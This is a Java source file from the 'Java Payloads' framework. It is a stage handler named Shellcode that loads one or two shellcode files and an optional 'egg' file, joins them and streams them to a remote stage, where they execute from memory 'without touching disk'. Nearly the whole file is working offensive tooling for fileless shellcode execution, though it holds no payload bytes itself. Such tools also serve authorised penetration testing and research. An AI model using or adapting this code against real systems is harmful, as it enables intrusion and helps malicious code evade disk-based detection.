/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stage;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;

import javapayload.Parameter;
import javapayload.stage.StreamForwarder;

public class Shellcode extends StageHandler {

	public Shellcode() {
		super("Load shellcode without touching disk", true, true,
				"Upload shellcode (<5K) and execute it from memory. Larger shellcode can use an egg runner.");
	}

	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("SHELLCODE", false, Parameter.TYPE_PATH, "Path to the shellcode file"),
				new Parameter("SHELLCODE_PART_TWO", true, Parameter.TYPE_PATH, "Path to the file for the second part of the shellcode"),
				new Parameter("EGG", true, Parameter.TYPE_PATH, "Path to the egg file")
		};
	}

	protected void customUpload(DataOutputStream out, String[] parameters) throws Exception {
		for (int i = 0; i < parameters.length; i++) {
			if (parameters[i].equals("--")) {
				String shellcodePath = parameters[i+2];
				String shellcodePath2 = (i+3 < parameters.length) ? parameters[i+3] : null;
				String eggPath = (i+4 < parameters.length) ? parameters[i+4] : null;
				byte[] shellcode = load(shellcodePath);
				if (shellcodePath2 != null) {
					final byte[] shellcode1 = shellcode;
					final byte[] shellcode2 = load(shellcodePath2);
					shellcode = new byte[shellcode1.length + shellcode2.length];
					System.arraycopy(shellcode1, 0, shellcode, 0, shellcode1.length);
					System.arraycopy(shellcode2, 0, shellcode, shellcode1.length, shellcode2.length);
				}
				byte[] egg = eggPath == null ? new byte[0] : load(eggPath);
				out.writeInt(shellcode.length);
				out.write(shellcode);
				out.writeInt(egg.length);
				out.write(egg);
				out.flush();
				break;
			}
		}
	}

	private byte[] load(String file) throws IOException {
		final ByteArrayOutputStream baos = new ByteArrayOutputStream();
		StreamForwarder.forward(new FileInputStream(file), baos);
		return baos.toByteArray();
	}

	public Class[] getNeededClasses() {
		return new Class[] { javapayload.stage.Stage.class, javapayload.stage.JITShellcodeRunner.class, javapayload.stage.Shellcode.class };
	}

	protected StageHandler createClone() {
		return new Shellcode();
	}
}
